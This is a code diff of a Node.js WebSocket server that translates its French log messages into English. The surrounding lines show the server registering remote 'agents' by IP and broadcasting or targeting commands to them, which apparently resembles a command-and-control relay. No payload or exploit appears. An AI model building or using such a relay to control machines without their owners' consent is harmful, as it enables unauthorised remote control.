@@ -49,7 +49,7 @@ wss.on('connection', (ws, req) => {
           command: data.command
         });
   
-        console.log(`[📢] Reçu commande broadcast -> "${data.command}"`);
+        console.log(`BROADCAST COMMAND RECEIVED -> "${data.command}"`);
   
         wss.clients.forEach(client => {
           if (client.readyState === WebSocket.OPEN) {
@@ -62,7 +62,7 @@ wss.on('connection', (ws, req) => {
   
           agents.set(ip, ws);
   
-          console.log(`[📝] Agent enregistré avec IP: ${ip}`);
+          console.log(`AGENT SAVED WITH IP: ${ip}`);
         
         
 
@@ -85,9 +85,9 @@ wss.on('connection', (ws, req) => {
       
           targetClient.send(payload);
       
-          console.log(`[🎯] Commande envoyée à ${targetIP} -> "${command}"`);
+          console.log(`COMMAND SEND to ${targetIP} -> "${command}"`);
         } else {
-          console.log(`[❌] Agent ${targetIP} non trouvé ou déconnecté.`);
+          console.log(`[❌] AGENT ${targetIP} NOT FOUND`);
         }
       
       
@@ -98,7 +98,7 @@ wss.on('connection', (ws, req) => {
       
       else {
         // Cas par défaut : relay message
-        console.log(`[🔁] Message standard reçu :`, msg);
+        console.log(`MESSAGE STANDARD RECEIVED :`, msg);
         wss.clients.forEach(client => {
           if (client.readyState === WebSocket.OPEN) {
             client.send(msg);
